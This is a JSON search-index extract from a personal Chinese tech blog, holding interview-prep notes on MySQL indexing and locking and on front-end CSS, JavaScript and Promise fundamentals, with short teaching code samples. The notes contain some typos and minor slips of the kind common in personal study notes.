B+Tree的搜索复杂度为O(logdN)其中d为节点允许的最大子节点个数，N为叶子节点数，由于二叉树只允许存在两个叶子节点，因此随着数据量的增加其高度会不断增加，导致查询效率下降，而B+Tree在实际应用中通常采用100以上的子节点个数，即使千万级的数据，也能将高度维持在3-4层 B+Tree VS Hash B+Tree比Hash表更适合做范围查询 按物理结构分 聚簇索引（主键索引）和二级索引（辅助索引） 主要区别： 聚簇索引的B+Tree中存放数据 二级索引的B+Tree中存放主键 查询数据需要回表，查询主键只需覆盖索引 按字段特性分 主键索引 建立在主键字段上的索引，通常在建表时一起创建 不能为空 一张表最多一个 唯一索引 建立在UNIQUE字段上的索引 不能重复 一张表可以有多个 普通索引 建立在普通字段上的索引 可以不为主键，可以重复 前缀索引 对字符串类型字段的前几个字符建立的索引 可建立在字段类型为char，varchar，binary，varbinary上 目的时为了减少索引占用的空间，提高查询效率 按字段个数分 单列索引 建立在单列上的索引 联合索引 建立在多列上的索引 最左匹配原则： 按照最左字段优先的方式进行排序和索引匹配 当最左字段相同适，依次右移一个字段进行排序和索引匹配 联合索引最左匹配的利用： 只有索引中的key是有序排列的时才能利用索引 在遇到范围查询时（&gt;、&lt;、between、like），会停止匹配，范围列可以用到联合索引，但是范围列后面的列无法用到联合索引 联合索引可以优化一些排序操作，例如对where state = 1 order by time asc，可以换成对state和time构建联合索引，利用索引的有序性进行查询，以避免排序中的文件排序操作，提高效率 索引下推优化（index condition） 对于联合索引而言使用主键进行索引判断后，有两个先择：1. 直接在联合索引中判断联合索引的后续字段是否匹配；2. 回表到主键表中在判断后续字段是否匹配 MySQL5.6后引入索引下推优化，可以在联合索引便利的过程中，对联合索引包含的字段先做判断，过滤不满足条件的记录，减少回表次数 索引区分度 区分度=distinct(column)count(∗)区分度 = \\frac{distinct(column)}{count(*)}区分度=count(∗)distinct(column)​即用字段中不同值的个数除以总行数 建立联合索引时，应尽量将区分度大的字段放在左侧 什么时候需要/不需要索引 优点 （高效查询）提高数据库检索效率，降低数据库IO的成本（创建索引的主要原因） （唯一性）创建唯一索引，保证数据库中数据的唯一性 （连接）在实现数据的参考完整性方面，加速表与表之间的连接 （排序分组）索引有助于减少排序，分组等操作的CPU消耗 缺点 （创建耗时）创建索引和维护索引需要花费额外的时间 （额外占空间）索引需要占据额外的磁盘空间 （更新耗时）降低数据库更新的效率，对数据库的增删改，都需要同时对索引进行维护 需要使用索引的场景 具有唯一性限制的字段 常用于作为WHERE查询的条件的字段，如果不是字段，可以考虑使用联合索引 常需要GROUP BY或ORDER BY的字段 不适合使用索引的场景 不需要用于WHERE查找或GROUP BY，ORDER BY的字段 区分度低的字段（有大量重复值） 因为MySQL存在查询优化器，当某一值的占比很高时，即忽略索引进行全表扫描 经常更新的字段 数据表数据很少时不需要创建索引 索引优化 前缀索引优化 对字符字段值的前 n个字符创建索引，减小索引字段的大小，从而增加一个索引页存储的索引值，有效提高索引的查询效率 局限性： ORDER BY无法利用前缀索引 前缀索引无法用于覆盖索引 覆盖索引优化 对一些字段建立二级索引或联合索引，从而减少回表的操作提高效率 主键索引最好自增 使用自增索引保证了数据按照主键递增顺序排列，可以使得新的数据插入时，直接插入到最后一条数据之后，从而避免了页分裂等数据挪动 页分裂： 可能造成大量内存碎片 使得索引结构不紧凑降低效率 索引最好设置为Not Null 主键为Null的缺点： 主键中包含Null导致优化器在做索引选择的时候更加复杂，更加难以优化，例如count会忽略掉为null的值，导致计数不准确 为Null的值没有意义，但同样需要占据1字节的空间 索引失效 使用左或者左右模糊匹配时，即like %xx或者like %xx%会引起索引失效 使用联合索引时，不符合向左匹配原则，会引起索引失效 查找时对索引进行了函数，数学，类型转换等操作时会引起索引失效 查找时or之前的条件是索引列而之后的不是，则会引起索引失效 锁 锁的分类 全局锁 表级锁 行级锁 全局锁 全局锁使用 1234--加锁flush tables with read lock--解锁unlock tables 全局锁会锁定整个数据库 处于上锁状态的数据库无法进行: 对数据的增删更新操作insert,update,delete等语句 对数据表的增删更新操作alter table, drop table等语句 当会话断开时全局锁会自动解锁 使用场景 当需要对数据库进行全库逻辑备份时会用到，这样在数据库备份期间就不会因为数据或数据表的变化导致备份数据与预期结果不同的情况了 全局锁的缺点 对数据库加全局锁就意味着数据库在加锁期间只能进行读操作，无法进行更新，这将导致大量业务停滞 如何避免备份过程导致的业务停滞 如果数据库引擎支持RR（可重复度模式）可以利用RR模式而不是加锁来解决这个问题 再进行备份之前在RR模式下开启事务，那么整个备份的过程中都会采用事务开启时创建的Read View进行备份 同时其他事务也能继续进行业务而不影响备份事务的Read View 备份数据库常用工具 mysqldump，在使用时加上-single-transaction就可以在备份开始之前开启事务，但这一方法只能在支持RR隔离等级的数据库引擎上使用 MyISAM由于不支持事务，因此只能使用全局锁来完成备份 表级锁 表锁 可以通过如下命令对数据表进行加锁 --加共享锁 lock tables my_table read --加排他锁 lock tables my_table write -- 解锁 unlock tables 表锁分为共享表锁（读锁）和排他表锁（写锁）两类 共享锁会阻塞接下来的写操作，排他锁会阻塞接下来的读写操作 需要注意的是即使是同一个事务，表锁也会对有序操作生效 使用InnoDB数据引擎的表不建议使用表锁，会影响效率，InnoDB提供了更为强大的行锁 元数据锁（MDL） MDL锁是什么 元数据锁不需要显示的上锁，当某一事物对数据表进行操作时会自动加上MDL，其目的是为了防止在用户对表中数据进行操作的过程中表的结构发生变化 对一张数据表进行CRUD操作时，会加MDL读锁，阻塞其他对数据表结构进行变更的操作的 对一张数据表做结构变更操作时，会加MDL写锁，阻塞其他CRUD操作 MDL锁什么时候注销 MDL只有当事物提交时才会注销 那么会导致一个问题： 如果一个事物对数据表进行读操作后，长时间不提交 那么当有一个事物想要对数据表结构进行变更时会被阻塞 后续其他线程想要对数据表进行CRUD操作时，同样会被阻塞，导致长时间的阻塞 造成这一现象的原因是申请DML锁的操作会形成一个队列，队列中写锁获取优先级高于读锁 因此在对数据表结构进行变更时，为了安全变更，需要先判断是否有长时间未提交的事务对表上了MDL读锁，如果有则考虑kill掉这个长时间任务然后再对表结构进行变更 意向锁 定义 在InnoDB引擎的表中对某些数据行（记录）加上共享锁之前，会对整个表加上一个意向共享锁 在InnoDB引擎的表中对某些数据行加（记录）上排他锁之前，会对整个表加上一个意向排他锁 作用 由于行锁和表锁是满足：读读共享，读写互斥，写写互斥的 因此当对表加上共享表锁的时候，需要便利表中的每一个条目，判断是否有数据行（记录）存在排他锁，这导致效率很慢 因此在加上表级意向锁后，直接查询表是否包含意向排他锁即可，提升了数据库效率 意向锁是表级的，不会和行级的共享锁和排他锁发生冲突，意向锁之间也不会发生冲突，但意向锁和共享表锁和排他表锁之间会发生冲突 AUTO-INC锁 数据库三大范式","categories":[{"name":"后端","slug":"后端","permalink":"http://enderxiao.github.io/categories/%E5%90%8E%E7%AB%AF/"},{"name":"mySQL","slug":"后端/mySQL","permalink":"http://enderxiao.github.io/categories/%E5%90%8E%E7%AB%AF/mySQL/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"mySQL","slug":"mySQL","permalink":"http://enderxiao.github.io/tags/mySQL/"}]},{"title":"前端八股","slug":"前端八股","date":"2023-10-18T03:00:13.000Z","updated":"2024-07-30T11:26:33.925Z","comments":true,"path":"2023/10/18/前端八股/","permalink":"http://enderxiao.github.io/2023/10/18/%E5%89%8D%E7%AB%AF%E5%85%AB%E8%82%A1/","excerpt":"","text":"CSS 盒模型 定义：HTML中每个元素都可以看成一个盒子 组成：内容（content），内边距（padding），边框（border），外边距（margin） 分类： 标准盒模型（content-box） 占据空间为margin + border + padding + content IE盒模型（border-box） 占据空间为margin + content（包含padding + border） 可以使用box-sizing：content-box（默认）/border-box切换模式 选择器优先级 CSS特性： 继承性：子元素继承父元素样式 层叠性：样式发生冲突时按照优先级进行选择 选择器类型： 0级别 !important 1级 行内样式（1级别） 二级 id选择器 类/伪类/属性选择器 标签/伪元素选择器 全局选择器 二级优先级计算： 百分位：ID选择器 十分位：类/伪类/属性选择器 个位：元素/伪元素选择器 隐藏元素的方法 display: none; 不占据位置 不可触发点击事件 子元素设置样式不可以显形 会修改DOM引起回流 visibility: hidden; 占据位置 不可触发点击事件 子元素设置样式可以显形 不会修改DOM，进行重绘即可 opacity: 0 占据位置 可以触发点击事件 子元素设置样式不能显形 不会修改DOM，进行重绘即可 display: absolute clip-path px/em/rem/vh/vw/百分比的区别 px：绝对单位，元素按照标准像素进行显示 em：相对单位，相对于父元素的font-size发生改变 rem：相对单位，相对于根节点（html）的font-size发生变化 当给html设置font-size = 62.5%时，1rem = 10px(16px * 62.5% = 10px) vh：相对单位，相对视口高度 1vw = 3.75px vw：相对单位，相对视口宽度 百分比：相对单位，相对于父元素 重绘与重排（回流）的区别⭐ 回流（重排）：布局引擎计算DOM元素在页面上的位置，大小的过程 重绘：布局引擎将DOM元素绘制到对应位置上的过程 浏览器渲染机制： 解析HTML 生成DOM树 解析CSS 生成CSS样式规则 将DOM树与样式规则结合形成渲染树 根据渲染树，计算DOM元素在页面中的位置（回流） 将DOM元素渲染到对应位置（重绘） 如何触发回流： 使用JS增删DOM元素 使用JS修改DOM元素宽高 使用JS修改DOM元素位置 如何触发重绘 更改DOM元素background-color 更改DOM元素color 更改DOM元素box-shadow 回流一定触发重绘，但重绘不一定触发回流 让一个元素水平/垂直居中的方法 标准流 + margin 标准流下使用margin: 0 auto实现水平居中 定位流 + margin 子绝父相 子设置top:0;left:0;right:0;bottom:0;margin:auto; 定位流 + transform 父相对定位 子绝对定位 子设置top:50%;left:50%;transform:translate(-50%,-50%) flex布局 父设置display:flex; 父设置justify-content:cneter;设置主轴居中（默认主轴为水平） 父设置align-item: center;设置交叉轴居中（默认交叉轴为垂直） grid布局 父设置display:grid 子设置justify-self: center水平居中 子设置align-self: center垂直居中 或子设置place-self: center水平、且垂直居中 table-cell 父设置display: table-cell 父设置text-align:center 水平居中 父设置vertical-align:middle 垂直居中 子设置display:inline-block CSS中可以继承的属性 字体属性font font-size font-weight… 文本属性 line-height text-align color 可见性属性 visibility 表格属性 border-spaceing 列表属性 list-style 页面样式属性 page 声音样式属性 预处理器（sass,less) 使用过Sass，为css提供了更多功能 变量@ 混入实现BME 函数 样式嵌套 丰富了css的结构性，可复用性，可维护性 Flex: 1是哪些属性 表示设置： 12flex-groth: 1 // 子元素按父元素剩余空间放大flex-shrink: 1 // 子元素按父元素空间缩小 BFC 块级上下文 解决的问题： 边塌陷 元素之间没有非空内容、padding、border或clear分隔 相邻元素之间 margin-top和第一个子元素的margin-top margin-bottom和最后一个子元素的margin-bottom（height为auto） margin-bottom和相邻兄弟的margin-top 元素自身不是BFC，没有子元素，height为0时，margin-top和margin-bottom会塌陷 清除浮动 浮动元素会造成父元素高度塌陷 原因是div高度默认为子元素高度，宽度默认为父元素的100% 当子元素设置浮动时，不再占据空间，因此父元素发生高度塌陷 解决方法： 浮动元素后添加一个元素设置clear: both 父元素设置伪元素并设置clear: both 父元素设置overflow: hidden 触发条件 float:left/right overflow: hidden | auto | scroll display: inline-block | table-cell | table-caption | flex | inline-flex position: absolute | fixed JS 节流和防抖 节流和防抖的区别 怎么写 节流：一段时间内的连续点击只执行最后一次 可以应用在搜索框联想 1234567891011function debounce(fn: Function, delay: number) &#123; let timer = null let that = this return function(...args) &#123; if(timer) clearTimeout(timer) timer = setTimeout(() =&gt; &#123; fn.apply(that, args) timer = null &#125;, delay) &#125;&#125; 节流：一段时间内的连续点击只执行第一次 可以应用在按钮点击和滚动事件 1234567891011function throttle(fn: Function, delay: number) &#123; let timer = null let that = this return function(...args) &#123; if(timer) return timer = setTimeout(() =&gt; &#123; fn.apply(that, args) timer = null &#125;, delay) &#125;&#125; typeof和instanceof typeof只能对比基本数据类型 instanceof对比prototype的类型 JS由哪三部分组成 ECMAScript JS核心内容 描述了语言的基础语法 DOM（文档对象模型） 将HTML元素规划为元素构成的文档 BOM（浏览器对象模型） 对浏览器进行访问和操作 JS内置对象及常用方法 Boolean Number String slice() split() concat() length Array from() of() map() … Object Function Date new Date() getYear() … Math abs() sqrt() min() max() Map Set Symbol RegExp Array常用方法 ES5 push() pop() shift() unshift() sort() reverse() concat() join() isArray() ES6新增 展开运算符… find，findIndex() Array.from() 类似数组对象 可便利对象 Array.of() 接收一组值构成数组 filter(),map(),reduce(),forEach() fill() entries(),keys,values() includes() flat(),flatMap() flatMap只能展开一层数组 flatMap接收一个函数，相当于对数组进行了map()后有进行了flat() 会修改原数组的方法： pop() push() shift() unshift() sort() reverse() splice() 判断数据类型的方法 typeof() 只能判断除null外的基本数据类型 引用数据类型均返回object instanceof() 返回true/false 只能判断引用数据类型 会顺着原型链查找，有则返回true 可以任意修改原型链的指向导致判断失效 constructor 几乎可以判断基本和引用数据类型 但构造函数的值可以任意修改导致判断失效 Object.prototype.toString().call() 最终解决方案 基本数据类型与引用数据类型的区别 基本数据类型 Number Boolean String Null Undefined 引用数据类型 Object Array Function … 基本数据类型的值直接保存在栈内存中 引用数据类型的值保存在堆内存中，其在堆内存中的地址将被保存在栈内存中 当两个引用类型同时指向同一地址时，修改其中一个其中的值，另一个里面的值也会一起改变 闭包及其特点 闭包： 函数嵌套函数 内部函数访问外部函数的数据 内部函数被外部函数返回出来并保存 特点： 可重复利用 不会污染全局作用域 这个变量会一直存在不被垃圾回收机制清除 缺点： 由于变量不会被垃圾回收机制清除，如果有太多闭包，会消耗内存，导致页面性能下降，在IE浏览器中会导致内存泄露 使用场景： 节流 防抖 函数嵌套以避免全局污染 前端内存泄露怎么理解 定义：JS中已经声明并分配内存，由于长时间未被使用或清除，导致长期占据内存，让内存资源大幅浪费，使得运行速度慢，甚至崩溃的情况 造成内存泄露的原因： 未声明直接赋值的变量 过多的闭包 未清理的定时器 一些引用元素未被清理 事件委托 是什么：又叫事件代理，是利用事件冒泡机制，将由子元素触发的事件委托给父元素进行处理的方法，如果子元素阻止了事件冒泡event.stopPropagation()则无法进行事件委托 优点： 当许多子元素需要绑定同一事件时，可以减少重复的代码，增强代码可读性 减少了事件绑定，即减少了内存占用 提高性能 说一下原型链⭐ 原型：也就是原型对象，是JS用来为构造函数的实例共享属性和方法的对象，使得所有实例只需要存一次该方法或属性（类似静态方法） 构造函数的原型对象通过Constructor.prototype访问 实例在调用函数时会从自身出发： 先查找自身是否具有该函数 如果没有则通过__proto__访问其构造函数的原型对象 如果仍然没有则会访问其原型对象的原型对象 说一下用new创建一个实例发生了什么事情（含手撕）⭐ 首先创建一个空对象 其次把空对象的原型链绑定到构造函数的原型对象上 然后将构造函数的this绑定为这个空对象 最后如果构造函数返回的时对象则直接返回，否则返回对象 123456789101112function myNew(Fn, ...args) &#123; // 1. 创建空对象 let newObj = &#123;&#125; // 2. 绑定原型链 // 不推荐使用newObj.__proto__ = Fn.prototype,因为__proto__已弃用 Object.setPrototypeOf(newObj, Fn.prototype) // 3. 将构造函数的this绑定为新的对象 let resObj = Fn.apply(newObj, args) // 4. 如果是对象则返回引用，否则返回对象 return resObj instanceof Object ? resObj : newObj &#125; JS如何实现继承⭐ 原型链继承 将子构造函数的原型对象设为父构造函数的一个实例 对子原型对象的构造函数重新赋值 function Parent(name) &#123; this.name = name; this.grade = [1, 2, 3] &#125; Parent.prototype.say = function() &#123; console.log(&quot;I am your father&quot;) &#125; function Child(gender) &#123; this.gender = gender &#125; // 将子类原型对象指向新的父类实例 // 以此构造出 // childObj.__proto__ -&gt; Child.prototype // Child.prototype.__proto__ -&gt; Parent.prototype Child.prototype = new Parent() // 注意此处需要重新链接构造函数 Child.prototype.constructor = Child let c1 = new Child(&#x27;男&#x27;) let c2 = new Child(&#x27;女&#x27;) c1.grade.push(4) console.log(c1.grade) // [1, 2, 3, 4] console.log(c2.grade) // [1, 2, 3, 4] &lt;!--code￼4--&gt; 优点： 书写简单 不存在引用赋值的问题 父构造函数可以接收参数 缺点 原型链丢失 无法访问父原型对象上的方法 组合继承 同时使用方法1和2 function Parent(name) &#123; this.name = name; this.grade = [1, 2, 3] &#125; Parent.prototype.say = function() &#123; console.log(&quot;I am your father&quot;) &#125; function Child(gender, ...args) &#123; Parent.apply(this, args) this.gender = gender &#125; Child.prototype = new Parent() Child.prototype.constructor = Child() let c1 = new Child(&#x27;男&#x27;, &#x27;小张&#x27;) let c2 = new Child(&#x27;女&#x27;, &#x27;小花&#x27;) c1.grade.push(4) console.log(c1.name) // 小张 console.log(c2.name) // 小花 console.log(c1.grade) // [1, 2, 3] console.log(c2.grade) // [1, 2, 3, 4] c1.say() // &quot;I am your father&quot; &lt;!--code￼5--&gt; 优点： 解决上述所有问题，且只需要调用一次父构造函数，是ES6之前最好的方式 ES6继承 先构造出父构造函数的this 用子构造函数修改this 子类的this对象继承了父类的this对象，然后对其进行加工 class Parent &#123; constructor(name) &#123; this.name = name; this.grade = [1, 2, 3] &#125; say() &#123; console.log(&quot;I am your father&quot;) &#125; &#125; class Child extends Parent &#123; constructor(gender, ...args) &#123; super(...args) this.gender = gender &#125; &#125; let c1 = new Child(&#x27;男&#x27;, &#x27;小张&#x27;) let c2 = new Child(&#x27;女&#x27;, &#x27;小花&#x27;) c1.grade.push(4) console.log(c1.name) // 小张 console.log(c2.name) // 小花 console.log(c1.grade) // [1, 2, 3] console.log(c2.grade) // [1, 2, 3, 4] c1.say() // &quot;I am your father&quot; &lt;!--code￼6--&gt; Ajax是什么，是怎么实现的⭐ ajax是一个创建交互式网页应用的网页开发技术 它可以在不重新加载页面的情况下与服务器发生数据交换并更新内容 ajax是通过XmlHttpRequest对象向服务器发送异步的请求，然后从服务器拿到响应数据，并通过JS操作DOM更新页面 创建xmh对象 xmh通过open()函数与服务器建立连接 构造请求参数，并通过xmh的send()方法向服务器发送参数 通过onreadystate changes事件监听服务器与我的通讯 处理服务器响应的结果 将结果渲染到页面上去 浏览器存储方式 cookies 兼容性好，请求头自带 H5标准前的本地存储方式 存储容量小，安全性差，浪费资源，使用麻烦（需要封装 localStorage H5加入的以键值对形式存储的存储方式 操作方便，永久存储，兼容性好 存储类型被限制只能是字符串和数字，不可被爬虫爬取，隐私模式下不可获取 在同一个域名下有效，跨域不同（http和https不同） sessionStorage 浏览器关闭即清除 会话级别的存储方式 在同一个域名下有效，跨域不同（http和https不同） IndexDB H5标准的存储方式 键值对形式存储 可快速读取 它数据量更大 支持字符串之外的类型，如二进制类型 支持事务 异步工作 websql websql是浏览器支持的关系数据库API，但现在不维护了 token存在哪里 定义：token是一种身份认证令牌，是用户通过账号密码登陆后，服务器把这些凭证信息通过加密等一系列操作后得到的字符串 存储位置及影响： 存在localStorage中时： 可以在同一浏览器的所有标签页和窗口中共享 每次向服务端发送请求时，都需要读取后当作一个字段传递给后端 容易受到XSS（跨站脚本）攻击，但做好了应对措施则利大于弊 存在cookies时： 即使在浏览器关闭后，cookie仍然存在 每次请求将会自动将token携带在请求中 不支持跨域，容易受到CSRF（跨站请求伪造）攻击 存在session时： 只存在于当前会话中，用户关闭浏览器后，sessionStorage中的数据将被清除。 浏览器中打开新的标签页或窗口，那么新的页面将无法访问sessionStorage中的数据。 token登录流程 客户端使用账号密码请求登录 服务端收到用户的登录信息后验证密码 验证成功后，服务端会向客户端签发一个token 客户端收到token后保存在cookies或localstorage或sessionstorage中 当客户端需要向服务端请求数据时，需要在请求中携带保存的token 服务端收到请求后验证token，验证成功才会返回客户请求的数据 get和post的区别 get一般用于获取数据，get一般用于上传数据 get参数会放在url上，安全性较差，有长度限制；post参数放在body中参数不会限制长度 get参数只支持url编码，post参数支持多种编码（表单等等） get请求会被浏览器缓存，post不会 get请求在浏览器刷新或回退时不会处理，post请求则会重新发送 get请求会被保存在浏览器历史记录中 浏览器从输入URL到看到页面发生了什么⭐ 检查缓存 如果浏览器有本地静态资源缓存，且未过期，则直接从缓存中读取，无需进行网络请求 DNS解析 将URL解析未IP地址，解析过程根据：本机host文件，本地DNS缓存，根据本地域名服务器的优先级解析域名 域名服务器解析域名可能涉及本机与顶级域名服务器、根域名服务器间的数据交换 建立TCP连接（三次握手 发送HTTP请求 如果是HTTPS则好需要建立TLS连接 接收响应后如果状态码是301/302还需要进行重定向 将响应结果交给渲染线程 构建DOM 解析HTML形成DOM树 计算样式 计算样式形成渲染树 布局 根据DOM树和渲染树，计算所有元素的坐标并生成布局树 分层 根据布局树生成不同图层，得到分层树 绘制 对分层树的每个层生成渲染质量，然后渲染引擎将质量交给合成线程处理 分块 合成线程将每个图层分块，优先渲染靠近视口的快，合成线程会把块交给光栅化线程 光栅化 光栅化线程把每个块转化为位图，写入显存 所有块光栅化完成后合成线程会生成DrawQuad指令交给浏览器，其中包含了每个块在显存中存放的位置 合成 浏览器接收到DQ指令后，将块合称为帧，调用GPU进程将渲染后的帧绘制到屏幕上 断开TCP连接（四次挥手 SVG了解多少 svg是基于XML语法规则的图片格式 svg是可缩放矢量图，无论如何缩放都不会是真 svg的本质是文本文件，体积小 svg可以直接插入HTML文件，称为DOM的一部分，并且可以使用JS或CSS操作 SVG也可以作为单独的文件被img标签引用 SVG可转化为base64编码引入页面 JWT了解多少⭐ JSON Web Token，通过json形式作为web应用中的令牌，可以在各方之间安全地把信息作为json对象传输 常用于信息传输、授权等（单点登录最常用JWT 事件捕获、冒泡、代理 事件流动： 事件捕获阶段 该阶段由顶层对象windows开始，沿DOM树逐级向下查找出发事件的元素 目标阶段 找到出发事件的最底层元素 事件冒泡阶段 从最底层元素开始，逐级向上触发事件 先捕获，后冒泡 不管对于非目标阶段或者目标阶段的元素，事件响应执行顺序都是遵循先捕获后冒泡的原则；通过使用定时器暂缓执行捕获事件，可以达到先冒泡后捕获的效果； 绑定事件时通过第三个参数useCapture设置回调触发的阶段，为true表示在捕获阶段触发，为false表示在冒泡阶段触发，默认为false： 12a.addEventListener(&#x27;click&#x27;, () =&gt; &#123;console.log(&quot;冒泡a&quot;)&#125;)a.addEventListener(&#x27;click&#x27;, () =&gt; &#123;console.log(&quot;捕获a&quot;)&#125;, true) 如果希望捕获事件在冒泡事件后触发，可以通过setTimeOut函数来讲函数的执行延后： 123456a.addEventListener(&#x27;click&#x27;, () =&gt; &#123;console.log(&quot;冒泡a&quot;)&#125;)a.addEventListener(&#x27;click&#x27;, () =&gt; &#123; setTimeOut(() =&gt; &#123; console.log(&quot;捕获a&quot;) &#125;)&#125;, true) 事件委托则是通过冒泡或捕获，实现的，由于事件会通过冒泡或捕获传递到他的父级元素，因此当需要给很多元素添加相同的事件时，可以通过为其父节点添加该事件，点击子元素时会由于事件冒泡触发父元素的 但实际使用中事件冒泡对浏览器的兼容性要优于事件捕获，因此更推荐使用使事件冒泡 123456&lt;ul id=&quot;item-list&quot;&gt; &lt;li&gt;item1&lt;/li&gt; &lt;li&gt;item2&lt;/li&gt; &lt;li&gt;item3&lt;/li&gt; &lt;li&gt;item4&lt;/li&gt;&lt;/ul&gt; 12345let itemList = document.getElementById(&quot;item-list&quot;)//事件捕获实现事件代理itemList.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;console.log(&#x27;捕获：click &#x27;,e.target.innerHTML)&#125;, true);//事件冒泡实现事件代理items.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;console.log(&#x27;冒泡：click &#x27;,e.target.innerHTML)&#125;, false); 如果需要阻止事件冒泡则使用： 1234567$(&quot;#div1&quot;).mousedown(function(e)&#123; var e=event||window.event; // 阻止事件冒泡 event.stopPropagation(); // 阻止默认事件 event.preventDefault();&#125;); 函数柯里化 函数柯里化是一种将接收多个参数的函数转化为接收单一参数的函数，并且返回接受余下的参数而且返回结果的新函数的技术 函数柯里化的作用： 参数复用 通过闭包机制，可以仅调用外层函数起到参数固定的作用 function curryingCheck(reg) &#123; return function(txt) &#123; return reg.test(txt) &#125; &#125; var hasDigit = curryingCheck(/\\d+/g) var hasLetter = curryingCheck(/[a-z]+/g) hasDigit(&#x27;test1&#x27;) // true hasDigit(&#x27;test&#x27;) // false hasLetter(&#x27;123&#x27;) // false &lt;!--code￼12--&gt; 延时运行 即调用方法时不会立即执行方法，只有当参数符合规定的时候才会执行返回想要的结果 function add(...args) &#123; return args.reduce((prev, current) =&gt; prev + current); &#125; function currylize(fn) &#123; let args = [] return function cb() &#123; // 当不传入参数调用时才返回结果 if(arguments.length &lt; 1) &#123; return fn(...args) &#125; else &#123; // 当传入参数时将参数保存起来 args = [...args, arguments] return cb &#125; &#125; &#125; add(1, 2, 3, 4); cAdd = currylize(add); cAdd(1)(2)(3)(4)(); &lt;!--code￼13--&gt; 答案： 12345678910111213141516function add() &#123; // 定义一个list存储参数 let args = Array.proptotype.slice.call(arguments) // 创建一个闭包，利用闭包特性将函数外的数据与函数绑定 let adder = function() &#123; args.push(...arguments) return adder &#125; // 利用隐式转换时调用的toString方法求值： adder.toString = function() &#123; return args.reduce(function(a, b) &#123; return a + b &#125;) &#125; return adder&#125; 通用柯里化函数可以这样写： 123456789101112131415161718192021222324252627function currylize(fn, ...rest) &#123; // 获取参数列表 let args = Array.prototype.slice.call(rest) // 否则就保存参数不计算，并返回新的闭包 let curry = function() &#123; args.push(...arguments) console.log(args) if(args.length &gt;= fn.length) &#123; let res = fn.apply(this, args) // 由于闭包的存在，调用结束需要将args清空 args = [] return res &#125; return curry &#125; return curry&#125;function add(a, b, c, d) &#123; return a + b + c + d;&#125;const curriedAdd = currying(add);curriedAdd(1)(2)(3)(4); // 10curriedAdd(1, 2, 3)(4); // 10curriedAdd(1, 2, 3, 4); // 10 Promise promise对象具有三个状态： pending fullfilled rejected 该对象以函数作为参数，当new Promise接收到函数时，立即执行该函数，这个函数以resolve、reject作为参数： 调用resolve则将promise的状态变为fullfilled 调用reject则将promise的状态变为rejected 其余时间状态为pending，当执行任务抛出异常时，状态也会变为rejected 状态变化后，会执行通过then注册的回调。执行顺序和调用then方法的顺序相同。调用then方法时候，如果状态是pending则注册回调，等到状态改变时候执行，如果状态已经改变则执行相应的回调。 then then方法返回包含两个参数： onFullfilled() onRejected() then返回一个新的Promise对象，可以链式调用then方法来查看其返回的Promise的情况： 1234let p = new Promise(resolve =&gt; &#123;resolve(&#x27;test&#x27;)&#125;);// 继续调用then方法返回的Promise对象中的then方法p.then(() =&gt; &#123;return true&#125;, e =&gt; &#123;throw new Error(&#x27;2&#x27;)&#125;).then( data =&gt; &#123;console.log(&#x27;resolve&#x27;, data)&#125;, e =&gt; &#123;console.error(&#x27;reject&#x27;, e)&#125;) Promise对象的特性： 返回一个新的Promise对象，该对象的状态与then的两个参数回调函数以及这两个回调函数的返回值有关 返回的Promise具有如下特性： 如果不传入参数 则返回的Promise对象的状态，与调用then的Promise对象的状态保持一致 可以简单地理解：如果上一个promise不处理，那就下一个promise处理。 如果then中的两个回调函数均无返回值 则会将Promise的状态设为fullfilled，且值为undefined 如果then中两个函数（不论fullfilled或rejected）均将返回一个没有then方法的值（非thenable对象） 则返回的Promise状态为fullfilled，值为调用then方法的promise对象的状态对应的then返回函数中返回的值 如果then中两个函数返回promise对象 则返回的Promise状态和值均与then中返回的promise对象相同 如果then中两个函数返回thenable对象 则返回的Promise状态取决于该thenable对象的状态，如果then中返回的thenable对象调用了resolvePromise，则返回的promise状态置为fullfilled，如果then中调用了rejectPromise，或者then中抛出异常，则返回的Promise状态置为rejected，在调用resolvePromise或者rejectPromise之前，返回的promise处于pending状态。 如果then中两个函数中抛出异常 则返回的Promise状态为rejected，值为抛出的异常中的信息 catch catch方法实际上等同于then中的onRejected()回调 Promise.prototype.catch()方法是.then(null, rejection)或.then(undefined, rejection)的别名，用于指定发生错误时的回调函数 ——《ES6入门教程》 阮一峰 123456p.then((val) =&gt; console.log(&#x27;fulfilled:&#x27;, val)) .catch((err) =&gt; console.log(&#x27;rejected&#x27;, err));// 等同于p.then((val) =&gt; console.log(&#x27;fulfilled:&#x27;, val)) .then(null, (err) =&gt; console.log(&quot;rejected:&quot;, err)); Primise.all all方法用于多个异步执行任务, 接收一个Promise[]作为参数 返回一个Promise对象 当Promise[]中所有Promise状态均为fullfilled时,其状态为fullfilled 当Promise[]由一个Promise状态为rejected时,其状态为rejected 该Promise对象的then方法中的onFullfilled回调函数的参数也是一个数组,对应Promise[]中每个Promise的值 可以理解为多任务的&amp;操作 如下代码的执行结果: 由于p1中的reject会立即执行,因此p1的状态变为rehected 那么Promise.all方法将直接返回一个状态为rejected的Promise对象 并且其值为引发rejected的对象的值 1秒后,p2的resolve回调打印p2 resolve 2 1234567891011121314151617const p1 = Promise.reject(1);const p2 = new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; console.log(&quot;p2 resolve&quot;, 2) resolve(2); &#125;, 1000);&#125;);Promise.all([p1, p2]).then( ([result1, result2]) =&gt; &#123;console.log(&#x27;resolve&#x27;, result1, result2);&#125;, e =&gt; console.log(&#x27;reject&#x27;, e));// 执行结果reject 1p2 resolve 2 Promise.race Promise.race方法用于多个异步任务执行 接收一个Promise[] 当有其中一个任务完成或失败时候，就执行后续处理的场景。 返回一个新的promise 当参数数组中其中一个promise resolve或者reject，返回的promise就相应地改变状态。 123456789101112131415var p1 = Promise.reject(1);var p2 = new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; resolve(2); &#125;, 1000);&#125;);Promise.race([p1, p2]).then( data =&gt; &#123;console.log(&#x27;resolve&#x27;, data);&#125;, e =&gt; &#123;console.log(&#x27;reject&#x27;, e);&#125;);// 执行结果reject 1 Promise.allSettled Promise.allSettled用于多个异步任务 接收一个Promise[] 返回一个新的Promise 当Promise[]中所有Promise的状态均不为pending时,状态变为fullfilled 其onFullfilled回调函数接受一个Object[]作为参数,其中每一个对象格式固定为{status, value, reason}: 标识状态 resolve返回值(状态为rejected时没有该参数) reject原因。(状态为fullfilled时没有该参数) 1234567891011121314var p1 = 